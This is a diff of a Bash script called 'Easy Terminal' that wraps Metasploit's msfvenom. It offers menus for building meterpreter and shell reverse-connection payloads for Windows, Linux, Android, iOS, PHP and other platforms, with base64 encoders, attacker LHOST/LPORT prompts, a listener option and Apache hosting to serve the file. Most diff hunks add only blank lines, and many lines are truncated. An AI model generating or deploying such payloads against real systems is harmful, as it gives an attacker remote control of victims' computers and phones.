@@ -4,13 +4,335 @@
 
 
 
-
-
 if [ "$(id -u)" != "0" ]; then
 
-
-
     echo "This script must be run as root" 1>&2
+
+    exit 1
+
+fi
+
+
+
+menu() {
+
+clear
+
+echo "  ____ _   _ _____ ____ _  _____ _   _  ____ "
+
+echo " / ___| | | | ____/ ___| |/ /_ _| \ | |/ ___|"
+
+echo "| |   | |_| |  _|| |   | ' / | ||  \| | |  _   _    _    _ "
+
+echo "| |___|  _  | |__| |___| . \ | || |\  | |_| | (_)  (_)  (_)"
+
+echo " \____|_| |_|_____\____|_|\_\___|_| \_|\____|"
+
+echo
+
+echo
+
+}
+
+
+
+menu
+
+
+
+# Define colors
+
+
+
+RED='\033[0;31m'
+
+
+
+GREEN='\033[0;32m'
+
+
+
+NC='\033[0m' # No Color
+
+
+
+
+
+
+
+# Function to check if a command exists
+
+
+
+check_command() {
+
+
+
+    command -v "$1" >/dev/null 2>&1
+
+
+
+}
+
+
+
+
+
+
+
+# Function to check if a file exists at specific paths
+
+
+
+check_file() {
+
+
+
+    for path in "$@"; do
+
+
+
+        if [ -f "$path" ]; then
+
+
+
+            return 0
+
+
+
+        fi
+
+
+
+    done
+
+
+
+    return 1
+
+
+
+}
+
+
+
+
+
+
+
+# Function to check for root privileges
+
+
+
+check_root() {
+
+
+
+    printf "Checking for root privileges: "
+
+
+
+    if [ "$(id -u)" -eq 0 ]; then
+
+
+
+        printf "[ ${GREEN}✔${NC} ]\n"
+
+
+
+    else
+
+
+
+        printf "[ ${RED}✘${NC} ]\n"
+
+
+
+        return 1
+
+
+
+    fi
+
+
+
+}
+
+
+
+
+
+
+
+# Function to check each required program
+
+
+
+check_program() {
+
+
+
+    printf "Checking for %-10s       " "$1":
+
+
+
+    if check_command "$1" || check_file "$2" "$3" "$4" "$5" "$6" "$7" "$8" "$9"; then
+
+
+
+        printf "[ ${GREEN}✔${NC} ]\n"
+
+
+
+    else
+
+
+
+        printf "[ ${RED}✘${NC} ]\n"
+
+
+
+        MISSING_PROGRAMS="$MISSING_PROGRAMS $1"
+
+
+
+    fi
+
+
+
+}
+
+
+
+
+
+
+
+# Check for Metasploit specifically
+
+
+
+check_metasploit() {
+
+
+
+    printf "Checking for Metasploit:      "
+
+
+
+    if check_command "msfconsole" || check_file "/usr/bin/msfconsole" "/usr/local/bin/msfconsole" "/bin/msfconsole" "/usr/sbin/msfconsole" "/sbin/msfconsole"; then
+
+
+
+        printf "[ ${GREEN}✔${NC} ]\n"
+
+
+
+    else
+
+
+
+        printf "[ ${RED}✘${NC} ]\n"
+
+
+
+        MISSING_PROGRAMS="$MISSING_PROGRAMS metasploit"
+
+
+
+    fi
+
+
+
+}
+
+
+
+
+
+
+
+# Start checks
+
+
+
+echo
+
+
+
+check_root
+
+
+
+sleep 1
+
+
+
+
+
+
+
+MISSING_PROGRAMS=""
+
+
+
+
+
+
+
+check_program xterm "/usr/bin/xterm" "/usr/local/bin/xterm" "/bin/xterm" "/usr/sbin/xterm" "/sbin/xterm"
+
+
+
+sleep 1
+
+
+
+check_program lolcat "/usr/bin/lolcat" "/usr/local/bin/lolcat" "/bin/lolcat" "/usr/sbin/lolcat" "/sbin/lolcat"
+
+
+
+sleep 1
+
+
+
+check_program figlet "/usr/bin/figlet" "/usr/local/bin/figlet" "/bin/figlet" "/usr/sbin/figlet" "/sbin/figlet"
+
+
+
+sleep 1
+
+
+
+check_metasploit
+
+
+
+sleep 1
+
+
+
+check_program msfvenom "/usr/bin/msfvenom" "/usr/local/bin/msfvenom" "/bin/msfvenom" "/usr/sbin/msfvenom" "/sbin/msfvenom"
+
+
+
+
+
+
+
+# Handle missing programs
+
+
+
+if [ -n "$MISSING_PROGRAMS" ]; then
+
+
+
+    echo "Some required programs are missing. Please run install.sh to install them."
+
+
+
+    read -p "Press Enter to exit..."
 
 
 
@@ -26,7 +348,51 @@ fi
 
 
 
+echo
+
+
+
+echo "All required programs are installed."
+
+
+
+echo
+
+
+
+echo "Press Enter to continue with the script..."
+
+
+
+read cont
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 # Define Colors
+
+
+
+
 
 
 
@@ -34,7 +400,15 @@ cyan='\e[0;36m'
 
 
 
+
+
+
+
 Blue2='\e[0;34m'
+
+
+
+
 
 
 
@@ -42,7 +416,15 @@ okegreen='\033[92m'
 
 
 
+
+
+
+
 white='\e[1;37m'
+
+
+
+
 
 
 
@@ -50,7 +432,15 @@ red='\e[1;31m'
 
 
 
+
+
+
+
 yellow='\e[0;33m'
+
+
+
+
 
 
 
@@ -62,7 +452,19 @@ orange='\e[0;33m'
 
 
 
+
+
+
+
+
+
+
+
 #menu
+
+
+
+
 
 
 
@@ -70,7 +472,15 @@ print_menu() {
 
 
 
+
+
+
+
     echo $Blue2"========================================================================="
+
+
+
+
 
 
 
@@ -78,7 +488,15 @@ print_menu() {
 
 
 
+
+
+
+
     echo "[---]       Welcome to Easy Terminal ( Version 1.4.1 Beta )       [---]"| lolcat 
+
+
+
+
 
 
 
@@ -86,7 +504,15 @@ print_menu() {
 
 
 
+
+
+
+
     echo "[---]                    Created by:DevBO7MED                     [---]"| lolcat
+
+
+
+
 
 
 
@@ -94,7 +520,15 @@ print_menu() {
 
 
 
+
+
+
+
     echo $Blue2"========================================================================="
+
+
+
+
 
 
 
@@ -102,7 +536,15 @@ print_menu() {
 
 
 
+
+
+
+
     echo $okegreen "    [01] Start Nmap Scan           "
+
+
+
+
 
 
 
@@ -110,7 +552,15 @@ print_menu() {
 
 
 
+
+
+
+
     echo $okegreen "    [03] Create Metasploit Listener"
+
+
+
+
 
 
 
@@ -118,7 +568,15 @@ print_menu() {
 
 
 
+
+
+
+
     echo $okegreen "    [05] Start Apache2 And Upload File"
+
+
+
+
 
 
 
@@ -126,7 +584,15 @@ print_menu() {
 
 
 
+
+
+
+
     echo $okegreen "    [07] Update & Upgrade System"
+
+
+
+
 
 
 
@@ -134,7 +600,15 @@ print_menu() {
 
 
 
+
+
+
+
     echo $okegreen "    [09] Check For Updates      "
+
+
+
+
 
 
 
@@ -142,7 +616,23 @@ print_menu() {
 
 
 
+
+
+
+
 }
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -158,7 +648,19 @@ print_menu() {
 
 
 
+
+
+
+
 show_ip_addresses() {
+
+
+
+
+
+
+
+
 
 
 
@@ -170,7 +672,15 @@ show_ip_addresses() {
 
 
 
+
+
+
+
     echo "=============================="
+
+
+
+
 
 
 
@@ -178,7 +688,15 @@ show_ip_addresses() {
 
 
 
+
+
+
+
     echo "=============================="
+
+
+
+
 
 
 
@@ -194,7 +712,23 @@ show_ip_addresses() {
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
 #easy terminal update
+
+
+
+
 
 
 
@@ -206,11 +740,27 @@ update_script() {
 
 
 
+
+
+
+
+
+
+
+
     repo_url="https://github.com/DevBO7MED/easy-terminal-script"
 
 
 
+
+
+
+
     
+
+
+
+
 
 
 
@@ -218,11 +768,27 @@ update_script() {
 
 
 
+
+
+
+
     
 
 
 
+
+
+
+
     temp_dir="/tmp/easy-terminal-update"
+
+
+
+
+
+
+
+
 
 
 
@@ -238,7 +804,19 @@ update_script() {
 
 
 
+
+
+
+
+
+
+
+
     
+
+
+
+
 
 
 
@@ -250,11 +828,27 @@ update_script() {
 
 
 
+
+
+
+
+
+
+
+
    
 
 
 
+
+
+
+
     echo "Cloning repository to temporary directory..."
+
+
+
+
 
 
 
@@ -266,7 +860,19 @@ update_script() {
 
 
 
+
+
+
+
+
+
+
+
     if [ $? -ne 0 ]; then
+
+
+
+
 
 
 
@@ -274,11 +880,27 @@ update_script() {
 
 
 
+
+
+
+
         exit 1
 
 
 
+
+
+
+
     fi
+
+
+
+
+
+
+
+
 
 
 
@@ -290,7 +912,19 @@ update_script() {
 
 
 
+
+
+
+
     files_to_check="install.sh eterm.sh"
+
+
+
+
+
+
+
+
 
 
 
@@ -302,7 +936,15 @@ update_script() {
 
 
 
+
+
+
+
     update_needed=0
+
+
+
+
 
 
 
@@ -310,7 +952,15 @@ update_script() {
 
 
 
+
+
+
+
         if [ -f "$script_dir/$file" ] && [ -f "$temp_dir/$file" ]; then
+
+
+
+
 
 
 
@@ -318,7 +968,15 @@ update_script() {
 
 
 
+
+
+
+
             if ! cmp -s "$script_dir/$file" "$temp_dir/$file"; then
+
+
+
+
 
 
 
@@ -326,7 +984,15 @@ update_script() {
 
 
 
+
+
+
+
                 update_needed=1
+
+
+
+
 
 
 
@@ -334,7 +1000,15 @@ update_script() {
 
 
 
+
+
+
+
         else
+
+
+
+
 
 
 
@@ -342,11 +1016,23 @@ update_script() {
 
 
 
+
+
+
+
             update_needed=1
 
 
 
+
+
+
+
         fi
+
+
+
+
 
 
 
@@ -358,7 +1044,19 @@ update_script() {
 
 
 
+
+
+
+
+
+
+
+
     if [ $update_needed -eq 1 ]; then
+
+
+
+
 
 
 
@@ -366,7 +1064,15 @@ update_script() {
 
 
 
+
+
+
+
         for file in $files_to_check; do
+
+
+
+
 
 
 
@@ -374,7 +1080,15 @@ update_script() {
 
 
 
+
+
+
+
                 cp "$temp_dir/$file" "$script_dir/"
+
+
+
+
 
 
 
@@ -382,7 +1096,15 @@ update_script() {
 
 
 
+
+
+
+
         done
+
+
+
+
 
 
 
@@ -390,7 +1112,15 @@ update_script() {
 
 
 
+
+
+
+
     else
+
+
+
+
 
 
 
@@ -398,7 +1128,23 @@ update_script() {
 
 
 
+
+
+
+
     fi
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -418,7 +1164,19 @@ update_script() {
 
 
 
+
+
+
+
+
+
+
+
     echo "Press [ENTER] to return to the menu."
+
+
+
+
 
 
 
@@ -426,7 +1184,15 @@ update_script() {
 
 
 
+
+
+
+
     clear
+
+
+
+
 
 
 
@@ -434,7 +1200,15 @@ update_script() {
 
 
 
+
+
+
+
 #payloads choose
+
+
+
+
 
 
 
@@ -442,7 +1216,15 @@ payloads() {
 
 
 
+
+
+
+
     	clear
+
+
+
+
 
 
 
@@ -450,11 +1232,23 @@ payloads() {
 
 
 
+
+
+
+
     	echo ""
 
 
 
+
+
+
+
    	echo $orange"+------------------------------------------+"
+
+
+
+
 
 
 
@@ -462,7 +1256,15 @@ payloads() {
 
 
 
+
+
+
+
    	echo $orange"|$white [2] $yellow Linux Payload$orange  |"
+
+
+
+
 
 
 
@@ -470,7 +1272,15 @@ payloads() {
 
 
 
+
+
+
+
         echo $orange"|$white [4] $yellow Ios Payload$orange     |"
+
+
+
+
 
 
 
@@ -478,7 +1288,15 @@ payloads() {
 
 
 
+
+
+
+
     	echo ""
+
+
+
+
 
 
 
@@ -486,19 +1304,43 @@ payloads() {
 
 
 
+
+
+
+
     	read payloads
 
 
 
-    
 
-
-
-    
 
 
 
     
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+
 
 
 
@@ -510,11 +1352,23 @@ payloads() {
 
 
 
+
+
+
+
         1)
 
 
 
+
+
+
+
             encoder_option
+
+
+
+
 
 
 
@@ -522,11 +1376,23 @@ payloads() {
 
 
 
+
+
+
+
             windows_msfvenom
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -534,7 +1400,15 @@ payloads() {
 
 
 
+
+
+
+
             encoder_option
+
+
+
+
 
 
 
@@ -542,7 +1416,15 @@ payloads() {
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -550,11 +1432,27 @@ payloads() {
 
 
 
+
+
+
+
             android_paylod
 
 
 
+
+
+
+
             ;;
+
+
+
+
+
+
+
+
 
 
 
@@ -566,11 +1464,23 @@ payloads() {
 
 
 
+
+
+
+
             ios_payload
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -578,7 +1488,15 @@ payloads() {
 
 
 
+
+
+
+
         *)
+
+
+
+
 
 
 
@@ -586,7 +1504,15 @@ payloads() {
 
 
 
+
+
+
+
             echo -e $red "Invalid option, choose between 1 and 10"
+
+
+
+
 
 
 
@@ -594,7 +1520,15 @@ payloads() {
 
 
 
+
+
+
+
             payloads
+
+
+
+
 
 
 
@@ -602,11 +1536,27 @@ payloads() {
 
 
 
+
+
+
+
     esac
 
 
 
+
+
+
+
 }
+
+
+
+
+
+
+
+
 
 
 
@@ -618,7 +1568,15 @@ payloads() {
 
 
 
+
+
+
+
 payload_option() {
+
+
+
+
 
 
 
@@ -626,7 +1584,15 @@ payload_option() {
 
 
 
+
+
+
+
     figlet "PAYLOAD TYPE" | lolcat
+
+
+
+
 
 
 
@@ -634,7 +1600,15 @@ payload_option() {
 
 
 
+
+
+
+
     echo $orange"+------------------------------------------+"
+
+
+
+
 
 
 
@@ -642,7 +1616,15 @@ payload_option() {
 
 
 
+
+
+
+
     echo $orange"|$white [2] $yellow windows/meterpreter/reverse_http$orange    |"
+
+
+
+
 
 
 
@@ -650,7 +1632,15 @@ payload_option() {
 
 
 
+
+
+
+
     echo $orange"|$white [4] $yellow linux/x86/meterpreter/reverse_tcp$orange   |"
+
+
+
+
 
 
 
@@ -658,7 +1648,15 @@ payload_option() {
 
 
 
+
+
+
+
     echo $orange"|$white [6] $yellow php/meterpreter/reverse_tcp$orange         |"
+
+
+
+
 
 
 
@@ -666,7 +1664,15 @@ payload_option() {
 
 
 
+
+
+
+
     echo $orange"|$white [8] $yellow android/meterpreter/reverse_tcp$orange     |"
+
+
+
+
 
 
 
@@ -674,7 +1680,15 @@ payload_option() {
 
 
 
+
+
+
+
     echo $orange"|$white [10]$yellow unix/meterpreter/reverse_tcp$orange        |"
+
+
+
+
 
 
 
@@ -682,7 +1696,15 @@ payload_option() {
 
 
 
+
+
+
+
     echo ""
+
+
+
+
 
 
 
@@ -690,19 +1712,43 @@ payload_option() {
 
 
 
+
+
+
+
     read payload_type
 
 
 
-    
 
-
-
-    
 
 
 
     
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+
 
 
 
@@ -714,7 +1760,15 @@ payload_option() {
 
 
 
+
+
+
+
         1)
+
+
+
+
 
 
 
@@ -722,7 +1776,15 @@ payload_option() {
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -730,11 +1792,23 @@ payload_option() {
 
 
 
+
+
+
+
             export PAYLOAD_TYPE="windows/meterpreter/reverse_http"
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -742,11 +1816,23 @@ payload_option() {
 
 
 
+
+
+
+
             export PAYLOAD_TYPE="windows/meterpreter/reverse_https"
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -754,11 +1840,23 @@ payload_option() {
 
 
 
+
+
+
+
             export PAYLOAD_TYPE="linux/x86/meterpreter/reverse_tcp"
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -766,11 +1864,23 @@ payload_option() {
 
 
 
+
+
+
+
             export PAYLOAD_TYPE="linux/x64/meterpreter/reverse_tcp"
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -778,11 +1888,23 @@ payload_option() {
 
 
 
+
+
+
+
             export PAYLOAD_TYPE="php/meterpreter/reverse_tcp"
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -790,11 +1912,23 @@ payload_option() {
 
 
 
+
+
+
+
             export PAYLOAD_TYPE="python/meterpreter/reverse_tcp"
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -802,11 +1936,23 @@ payload_option() {
 
 
 
+
+
+
+
             export PAYLOAD_TYPE="android/meterpreter/reverse_tcp"
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -814,11 +1960,23 @@ payload_option() {
 
 
 
+
+
+
+
             export PAYLOAD_TYPE="ios/meterpreter/reverse_tcp"
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -826,11 +1984,23 @@ payload_option() {
 
 
 
+
+
+
+
             export PAYLOAD_TYPE="unix/meterpreter/reverse_tcp"
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -838,7 +2008,15 @@ payload_option() {
 
 
 
+
+
+
+
             echo ""
+
+
+
+
 
 
 
@@ -846,7 +2024,15 @@ payload_option() {
 
 
 
+
+
+
+
             clear
+
+
+
+
 
 
 
@@ -854,7 +2040,15 @@ payload_option() {
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -862,7 +2056,19 @@ payload_option() {
 
 
 
+
+
+
+
 }
+
+
+
+
+
+
+
+
 
 
 
@@ -874,7 +2080,15 @@ payload_option() {
 
 
 
+
+
+
+
 windows_payload() {
+
+
+
+
 
 
 
@@ -882,7 +2096,15 @@ windows_payload() {
 
 
 
+
+
+
+
     figlet "PAYLOAD TYPE" | lolcat
+
+
+
+
 
 
 
@@ -890,7 +2112,15 @@ windows_payload() {
 
 
 
+
+
+
+
     echo $orange"+------------------------------------------+"
+
+
+
+
 
 
 
@@ -898,7 +2128,15 @@ windows_payload() {
 
 
 
+
+
+
+
     echo $orange"|$white [2] $yellow windows/meterpreter/reverse_http$orange    |"
+
+
+
+
 
 
 
@@ -906,7 +2144,15 @@ windows_payload() {
 
 
 
+
+
+
+
     echo $orange"+------------------------------------------+"
+
+
+
+
 
 
 
@@ -914,7 +2160,15 @@ windows_payload() {
 
 
 
+
+
+
+
     echo $okegreen"Choose Payload Type: ";tput sgr0
+
+
+
+
 
 
 
@@ -922,15 +2176,35 @@ windows_payload() {
 
 
 
-    
 
-
-
-    
 
 
 
     
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+
 
 
 
@@ -942,7 +2216,15 @@ windows_payload() {
 
 
 
+
+
+
+
         1)
+
+
+
+
 
 
 
@@ -950,7 +2232,15 @@ windows_payload() {
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -958,11 +2248,23 @@ windows_payload() {
 
 
 
+
+
+
+
             export windows_payload_type="windows/meterpreter/reverse_http"
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -970,11 +2272,27 @@ windows_payload() {
 
 
 
+
+
+
+
             export windows_payload_type="windows/meterpreter/reverse_https"
 
 
 
+
+
+
+
             ;;
+
+
+
+
+
+
+
+
 
 
 
@@ -986,7 +2304,15 @@ windows_payload() {
 
 
 
+
+
+
+
             echo ""
+
+
+
+
 
 
 
@@ -994,7 +2320,15 @@ windows_payload() {
 
 
 
+
+
+
+
             clear
+
+
+
+
 
 
 
@@ -1002,7 +2336,15 @@ windows_payload() {
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -1010,7 +2352,19 @@ windows_payload() {
 
 
 
+
+
+
+
 }
+
+
+
+
+
+
+
+
 
 
 
@@ -1022,7 +2376,15 @@ windows_payload() {
 
 
 
+
+
+
+
 linux_payload() {
+
+
+
+
 
 
 
@@ -1030,7 +2392,15 @@ linux_payload() {
 
 
 
+
+
+
+
     figlet "PAYLOAD TYPE" | lolcat
+
+
+
+
 
 
 
@@ -1038,7 +2408,15 @@ linux_payload() {
 
 
 
+
+
+
+
     echo $orange"+------------------------------------------+"
+
+
+
+
 
 
 
@@ -1046,7 +2424,15 @@ linux_payload() {
 
 
 
+
+
+
+
     echo $orange"|$white [2] $yellow linux/x64/meterpreter/reverse_tcp$orange   |"
+
+
+
+
 
 
 
@@ -1054,7 +2440,15 @@ linux_payload() {
 
 
 
+
+
+
+
     echo ""
+
+
+
+
 
 
 
@@ -1062,11 +2456,27 @@ linux_payload() {
 
 
 
+
+
+
+
     read linux_payload_type
 
 
 
+
+
+
+
     
+
+
+
+
+
+
+
+
 
 
 
@@ -1078,11 +2488,23 @@ linux_payload() {
 
 
 
+
+
+
+
         1)
 
 
 
+
+
+
+
             
+
+
+
+
 
 
 
@@ -1090,7 +2512,15 @@ linux_payload() {
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -1098,7 +2528,15 @@ linux_payload() {
 
 
 
+
+
+
+
             
+
+
+
+
 
 
 
@@ -1106,7 +2544,19 @@ linux_payload() {
 
 
 
+
+
+
+
             ;;
+
+
+
+
+
+
+
+
 
 
 
@@ -1118,7 +2568,15 @@ linux_payload() {
 
 
 
+
+
+
+
             echo ""
+
+
+
+
 
 
 
@@ -1126,7 +2584,15 @@ linux_payload() {
 
 
 
+
+
+
+
             clear
+
+
+
+
 
 
 
@@ -1134,7 +2600,15 @@ linux_payload() {
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -1142,7 +2616,19 @@ linux_payload() {
 
 
 
+
+
+
+
 }
+
+
+
+
+
+
+
+
 
 
 
@@ -1154,7 +2640,15 @@ linux_payload() {
 
 
 
+
+
+
+
 android_payload() {
+
+
+
+
 
 
 
@@ -1162,7 +2656,15 @@ android_payload() {
 
 
 
+
+
+
+
     figlet "ANDROID PAYLOAD TYPE" | lolcat
+
+
+
+
 
 
 
@@ -1170,7 +2672,15 @@ android_payload() {
 
 
 
+
+
+
+
     echo $orange"+------------------------------------------+"
+
+
+
+
 
 
 
@@ -1178,7 +2688,15 @@ android_payload() {
 
 
 
+
+
+
+
     echo $orange"|$white [2] $yellow android/shell/reverse_tcp$orange       |"
+
+
+
+
 
 
 
@@ -1186,7 +2704,15 @@ android_payload() {
 
 
 
+
+
+
+
     echo ""
+
+
+
+
 
 
 
@@ -1194,7 +2720,15 @@ android_payload() {
 
 
 
+
+
+
+
     read android_payload_type
+
+
+
+
 
 
 
@@ -1202,7 +2736,15 @@ android_payload() {
 
 
 
+
+
+
+
     case $android_payload_type in
+
+
+
+
 
 
 
@@ -1210,7 +2752,15 @@ android_payload() {
 
 
 
+
+
+
+
             export android_payload_type="android/meterpreter/reverse_tcp"
+
+
+
+
 
 
 
@@ -1218,7 +2768,15 @@ android_payload() {
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -1226,7 +2784,15 @@ android_payload() {
 
 
 
+
+
+
+
             export android_payload_type="android/shell/reverse_tcp"
+
+
+
+
 
 
 
@@ -1234,7 +2800,15 @@ android_payload() {
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -1242,7 +2816,15 @@ android_payload() {
 
 
 
+
+
+
+
             echo ""
+
+
+
+
 
 
 
@@ -1250,7 +2832,15 @@ android_payload() {
 
 
 
+
+
+
+
             clear
+
+
+
+
 
 
 
@@ -1258,7 +2848,15 @@ android_payload() {
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -1266,7 +2864,23 @@ android_payload() {
 
 
 
+
+
+
+
 }
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -1282,7 +2896,15 @@ android_payload() {
 
 
 
+
+
+
+
 ios_payload() {
+
+
+
+
 
 
 
@@ -1290,7 +2912,15 @@ ios_payload() {
 
 
 
+
+
+
+
     figlet "PAYLOAD TYPE" | lolcat
+
+
+
+
 
 
 
@@ -1298,7 +2928,15 @@ ios_payload() {
 
 
 
+
+
+
+
     echo $orange"+------------------------------------------+"
+
+
+
+
 
 
 
@@ -1306,7 +2944,15 @@ ios_payload() {
 
 
 
+
+
+
+
     echo $orange"|$white [2] $yellow ios/meterpreter/bind_tcp$orange       |"
+
+
+
+
 
 
 
@@ -1314,7 +2960,15 @@ ios_payload() {
 
 
 
+
+
+
+
     echo $orange"+------------------------------------------+"
+
+
+
+
 
 
 
@@ -1322,7 +2976,15 @@ ios_payload() {
 
 
 
+
+
+
+
     echo $okegreen"Choose Payload Type: "; tput sgr0
+
+
+
+
 
 
 
@@ -1330,7 +2992,15 @@ ios_payload() {
 
 
 
+
+
+
+
     
+
+
+
+
 
 
 
@@ -1338,7 +3008,15 @@ ios_payload() {
 
 
 
+
+
+
+
         1)
+
+
+
+
 
 
 
@@ -1346,11 +3024,23 @@ ios_payload() {
 
 
 
+
+
+
+
             ios_msfvenom
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -1358,7 +3048,15 @@ ios_payload() {
 
 
 
+
+
+
+
             export ios_payload_type="ios/meterpreter/bind_tcp"
+
+
+
+
 
 
 
@@ -1366,7 +3064,15 @@ ios_payload() {
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -1374,7 +3080,15 @@ ios_payload() {
 
 
 
+
+
+
+
             export ios_payload_type="ios/shell/reverse_tcp"
+
+
+
+
 
 
 
@@ -1382,7 +3096,15 @@ ios_payload() {
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -1390,7 +3112,15 @@ ios_payload() {
 
 
 
+
+
+
+
             echo ""
+
+
+
+
 
 
 
@@ -1398,7 +3128,15 @@ ios_payload() {
 
 
 
+
+
+
+
             clear
+
+
+
+
 
 
 
@@ -1406,7 +3144,15 @@ ios_payload() {
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -1414,7 +3160,19 @@ ios_payload() {
 
 
 
+
+
+
+
 }
+
+
+
+
+
+
+
+
 
 
 
@@ -1426,7 +3184,15 @@ ios_payload() {
 
 
 
+
+
+
+
 encoder_option() {
+
+
+
+
 
 
 
@@ -1434,7 +3200,15 @@ encoder_option() {
 
 
 
+
+
+
+
     figlet "ENCODER TYPE" | lolcat
+
+
+
+
 
 
 
@@ -1442,7 +3216,15 @@ encoder_option() {
 
 
 
+
+
+
+
     echo $orange"+------------------------------------------+"
+
+
+
+
 
 
 
@@ -1450,7 +3232,15 @@ encoder_option() {
 
 
 
+
+
+
+
     echo $orange"|$white [2] $yellow cmd/powershell_base64$orange|"
+
+
+
+
 
 
 
@@ -1458,7 +3248,15 @@ encoder_option() {
 
 
 
+
+
+
+
     echo $orange"|$white [4] $yellow ruby/base64$orange          |"
+
+
+
+
 
 
 
@@ -1466,7 +3264,15 @@ encoder_option() {
 
 
 
+
+
+
+
     echo ""
+
+
+
+
 
 
 
@@ -1474,19 +3280,43 @@ encoder_option() {
 
 
 
+
+
+
+
     read encoder_type
 
 
 
-    
 
-
-
-    
 
 
 
     
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+
 
 
 
@@ -1498,7 +3328,15 @@ encoder_option() {
 
 
 
+
+
+
+
         1)
+
+
+
+
 
 
 
@@ -1506,7 +3344,15 @@ encoder_option() {
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -1514,11 +3360,23 @@ encoder_option() {
 
 
 
+
+
+
+
             export encoder_type="cmd/powershell_base64"
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -1526,11 +3384,27 @@ encoder_option() {
 
 
 
+
+
+
+
             export encoder_type="php/base64"
 
 
 
+
+
+
+
             ;;
+
+
+
+
+
+
+
+
 
 
 
@@ -1542,11 +3416,23 @@ encoder_option() {
 
 
 
+
+
+
+
             export encoder_type="ruby/base64"
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -1554,7 +3440,15 @@ encoder_option() {
 
 
 
+
+
+
+
         *)
+
+
+
+
 
 
 
@@ -1562,7 +3456,15 @@ encoder_option() {
 
 
 
+
+
+
+
             echo -e $red "Invalid option, choose between 1 and 10"
+
+
+
+
 
 
 
@@ -1570,7 +3472,15 @@ encoder_option() {
 
 
 
+
+
+
+
             encoder_option
+
+
+
+
 
 
 
@@ -1578,11 +3488,27 @@ encoder_option() {
 
 
 
+
+
+
+
     esac
 
 
 
+
+
+
+
 }
+
+
+
+
+
+
+
+
 
 
 
@@ -1594,11 +3520,23 @@ windows_msfvenom() {
 
 
 
+
+
+
+
 clear
 
 
 
+
+
+
+
 clear
+
+
+
+
 
 
 
@@ -1606,11 +3544,23 @@ figlet "M S F V E N O M" | lolcat
 
 
 
+
+
+
+
 echo
 
 
 
+
+
+
+
 echo
+
+
+
+
 
 
 
@@ -1618,11 +3568,23 @@ show_ip_addresses
 
 
 
+
+
+
+
 echo
 
 
 
+
+
+
+
 echo
+
+
+
+
 
 
 
@@ -1630,7 +3592,15 @@ read -p "Enter LHOST (e.g., \"192.168.1.5\") " H
 
 
 
+
+
+
+
 echo
+
+
+
+
 
 
 
@@ -1638,7 +3608,15 @@ read -p "Enter LPORT (e.g., \"4444\") " P
 
 
 
+
+
+
+
 echo
+
+
+
+
 
 
 
@@ -1646,7 +3624,15 @@ read -p "Enter Payload Format (e.g., \"exe\") " format
 
 
 
+
+
+
+
 echo
+
+
+
+
 
 
 
@@ -1654,7 +3640,15 @@ read -p "Enter The Numbers to run the encoder (e.g., \"5\") " NUMBER
 
 
 
+
+
+
+
 echo
+
+
+
+
 
 
 
@@ -1662,7 +3656,15 @@ read -p "Enter Payload save path (e.g., \"/home/kali\"): " S
 
 
 
+
+
+
+
 echo
+
+
+
+
 
 
 
@@ -1670,7 +3672,15 @@ read -p "Enter Payload name (e.g., \"Payload.exe\"): " name
 
 
 
+
+
+
+
 echo
+
+
+
+
 
 
 
@@ -1678,7 +3688,15 @@ read -p "Choose x86 Bit Payload or x64 Bit Payload (e.g., \"x86\") " ARK
 
 
 
+
+
+
+
 echo
+
+
+
+
 
 
 
@@ -1686,7 +3704,15 @@ echo    "Creating Payload..."
 
 
 
+
+
+
+
 echo
+
+
+
+
 
 
 
@@ -1694,7 +3720,15 @@ msfvenom -p $windows_payload_type --platform windows LHOST=$H LPORT=$P -a $ARK -
 
 
 
+
+
+
+
 if [ $? -eq 0 ]; then
+
+
+
+
 
 
 
@@ -1702,15 +3736,15 @@ if [ $? -eq 0 ]; then
 
 
 
+
+
+
+
                 figlet "M S F V E N O M" | lolcat
 
 
 
-                echo
 
-
-
-                echo
 
 
 
@@ -1718,7 +3752,31 @@ if [ $? -eq 0 ]; then
 
 
 
+
+
+
+
                 echo
+
+
+
+
+
+
+
+                echo
+
+
+
+
+
+
+
+                echo
